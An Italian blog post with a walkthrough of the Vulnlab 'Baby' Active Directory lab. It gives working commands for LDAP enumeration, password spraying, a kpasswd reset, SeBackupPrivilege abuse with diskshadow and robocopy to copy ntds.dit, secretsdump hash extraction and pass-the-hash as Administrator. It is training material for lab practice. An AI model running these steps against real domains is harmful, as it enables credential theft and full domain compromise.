+++
date = '2026-07-07T12:35:35+02:00'
draft = false
title = 'Baby Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`12/06/2025`**

![baby-slide.png](/images/imgs_baby/baby-slide.png)

---
# Introduzione

**_Baby_** è un ambiente **Active Directory** di livello **Easy** creato da **Vulnlab**, incentrato sull'enumerazione di base di **AD** e sullo sfruttamento di misconfiguration comuni.

Il punto di accesso iniziale richiede di enumerare **LDAP** per ottenere una lista di utenti e una password di default, per poi lanciare un attacco di **password spraying**. Trovando un account con la password scaduta, ho sfruttato **Kerberos kpasswd** per resettarla e ottenere l'accesso tramite **WinRM**. Per la privilege escalation, ho abusato del **`SeBackupPrivilege`** utilizzando **Diskshadow e Robocopy** per estrarre il database **`ntds.dit`**. Questo mi ha permesso di dumpare l'**hash NTLM** dell'**Administrator** e di eseguire un attacco **Pass-The-Hash** per compromettere interamente il dominio.

---
# Tecniche Utilizzate
- **Enumerazione LDAP & Password Spraying**

- **Abuso di Kerberos kpasswd**

- **Abuso del SeBackupPrivilege**

- **Estrazione `ntds.dit` & Pass-The-Hash**

---
# Enumerazione

## nmap

Scansione iniziale di tutte le porte:

```bash
nmap -p- baby
```

![nmap1.png](/images/imgs_baby/nmap1.png)

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV -Pn baby
```

![nmap2.png](/images/imgs_baby/nmap2.png)

**Porte Aperte**:
- **53**/tcp - DNS

- **88**/tcp - Kerberos

- **135**/tcp - MSRPC

- **139**/tcp - netbios-ssn

- **389**/tcp - LDAP

- **445**/tcp - microsoft-ds (SMB)

- **464**/tcp - kpasswd5

- **3268**/tcp - LDAP Global Catalog

- **3389**/tcp - RDP

- **5985**/tcp - WinRM

## Enumerazione SMB & LDAP

Ho iniziato controllando l'accesso anonimo su **SMB** utilizzando **NetExec**, ma era disabilitato.

```bash
nxc smb 10.10.102.118 -u '' -p '' --shares
nxc smb 10.10.102.118 -u '' -p '' --users
```

![smbenum.png](/images/imgs_baby/smbenum.png)

Sono passato quindi all'enumerazione anonima tramite **LDAP**.

```bash
nxc ldap 10.10.102.118 -u '' -p '' --users
```

![ldapenum.png](/images/imgs_baby/ldapenum.png)

Sono riuscito a recuperare una lista di utenti del dominio, che ho salvato in un file chiamato **`users.txt`**:

```text
Jaqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson 
```

Cosa ancora più importante, durante l'enumerazione **LDAP**, è stata scoperta una password di default negli attributi utente:

```text
BabyStart123!
```

---
# Accesso Iniziale | Password Spraying → reset kpasswd

Armato di una lista utenti valida e di una potenziale password di default, ho eseguito un attacco di **password spraying** contro il servizio **SMB**.

```bash
nxc smb 10.10.102.118 -u users.txt -p 'BabyStart123!'
```

![spraying.png](/images/imgs_baby/spraying.png)

Lo spray ha rivelato che l'utente **Caroline.Robinson** stava effettivamente utilizzando questa password, ma il suo account aveva la flag "**Password Expired**" impostata.

**Nota**: _Normalmente, questo impedirebbe un login standard tramite **WinRM** o **SMB**. Tuttavia, **Kerberos** fornisce un meccanismo integrato per cambiare le password scadute tramite l'utility **kpasswd** (**porta 464**)._

Per utilizzare **kpasswd**, dovevo prima configurare la mia macchina attaccante per farla comunicare con il **Kerberos Key Distribution Center** (**KDC**) del bersaglio.

Ho modificato il mio file **`/etc/krb5.conf`**:

```text
[libdefaults]
        default_realm = BABY.VL
        dns_lookup_realm = false
        ticket_lifetime = 24h
        renew_lifetime = 7d
        rdns = false
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
[realms]
        BABY.VL = {
                kdc = BABYDC.BABY.VL
                admin_server = BABYDC.BABY.VL          
        }
```

Configurato il realm, ho richiesto un cambio password per l'account scaduto:

```bash
kpasswd Caroline.Robinson
```

![kpass.png](/images/imgs_baby/kpass.png)

Dopo aver impostato con successo una nuova password, mi sono connesso alla macchina utilizzando **Evil-WinRM**:

![carolinaproof.png](/images/imgs_baby/carolinaproof.png)

Nel Desktop dell'utente era presente la **user flag**.

---
# Privilege Escalation | Abuso del SeBackupPrivilege

Una volta all'interno del sistema, ho iniziato la mia solita enumerazione locale controllando i privilegi dell'utente corrente.

```powershell
whoami /priv
```

![whoamipriv.png](/images/imgs_baby/whoamipriv.png)

Ho notato immediatamente che il **`SeBackupPrivilege`** era abilitato.

**Nota**: _Il **`SeBackupPrivilege`** è stato progettato per consentire ai software di backup di leggere tutti i file su un sistema, bypassando i normali **permessi di Lettura/Scrittura NTFS**. Un attaccante può abusare di questo privilegio per estrarre file sensibili normalmente bloccati o inaccessibili, come il database di **Active Directory** **`ntds.dit`** e l'hive di registro **SYSTEM**._

Per sfruttarlo, ho seguito questa guida:

- https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960

(**Method 1**)

Ho utilizzato l'utility **Diskshadow** per creare un **Volume Shadow Copy** del disco **`C:`**, che consente di copiare file attualmente in uso dal sistema operativo.

Ho creato uno script malevolo chiamato **`backup.txt`** sulla mia macchina attaccante:

```text
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

L'ho caricato sulla macchina bersaglio tramite la funzione di upload di **Evil-WinRM**:

```bash
upload backup.txt
```

Ho quindi eseguito **Diskshadow** utilizzando lo script caricato:

```powershell
diskshadow /s backup.txt
```

Con il disco **`C:`** esposto con successo come disco **`E:`**, ho utilizzato **Robocopy** (in modalità backup /b) per estrarre il file **`ntds.dit`**:

```powershell
robocopy /b E:\Windows\ntds . ntds.dit
```

Successivamente, mi serviva l'hive di registro **SYSTEM** per estrarre la chiave di boot necessaria a decriptare il database **`ntds.dit`**:

```powershell
reg save hklm/system system.bak
```

Ho scaricato sia **`ntds.dit`** che **`system.bak`** sulla mia macchina attaccante:

```powershell
download ntds.dit 
download system.bak
```

## Dumping degli Hash & Compromissione del Dominio

Tornato sulla mia macchina locale, ho configurato un **ambiente virtuale Python** e installato **Impacket** per parsare il database.

```bash
python3 -m venv venv 
source venv/bin/activate
pip3 install impacket
```

Ho utilizzato **`secretsdump.py`** di **Impacket** per estrarre tutti gli **hash NTLM** dai file dumpati:

```bash
secretsdump.py -ntds ntds.dit -system system.bak -hashes lmhash:nthash LOCAL
```

Ho estratto l'**NTLM hash** dell'account **Administrator**:

```text
ee<REDACTED>3d
```

Sfruttando questo hash, ho eseguito un attacco **Pass-The-Hash** per stabilire una sessione **WinRM**:

```bash
evil-winrm -i baby.vl -u Administrator -H ee<REDACTED>3d
```

Nel Desktop dell'**Administrator** era presente la **root flag**.

**Nota**: _Per l'accesso a lungo termine, una classica tecnica di persistenza **Red Team** prevede la creazione di un nuovo utente locale e la sua aggiunta al gruppo **Administrators**, oppure l'impostazione di una **scheduled task** che avvia una reverse shell al riavvio. Nessuna modifica persistente è stata lasciata in questo lab._

---
# Considerazioni Finali

**_Baby_** è un'ottima macchina introduttiva agli ambienti **Active Directory**.

Mette perfettamente in luce uno scenario reale molto comune: amministratori che impostano password di default e si affidano al flag "**Password Expired**" come misura di sicurezza, dimenticandosi completamente delle capacità di **Kerberos kpasswd**.

Il percorso di privilege escalation evidenzia un classico **Low-Hanging Fruit** negli ambienti **Active Directory**, affrontato in questo caso con una metodologia **Red Team** standard: sfruttare manualmente il **`SeBackupPrivilege`** utilizzando binari nativi di Windows come **diskshadow e robocopy** (tecniche Living off the Land). Queste sono skill essenziali da padroneggiare per eludere i rilevamenti di base, specialmente quando ci si prepara per certificazioni pratiche come l'**OSCP**.

**Fonti**:

- **Windows PrivEsc with SeBackupPrivilege (R3d Buck3t) | https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960**
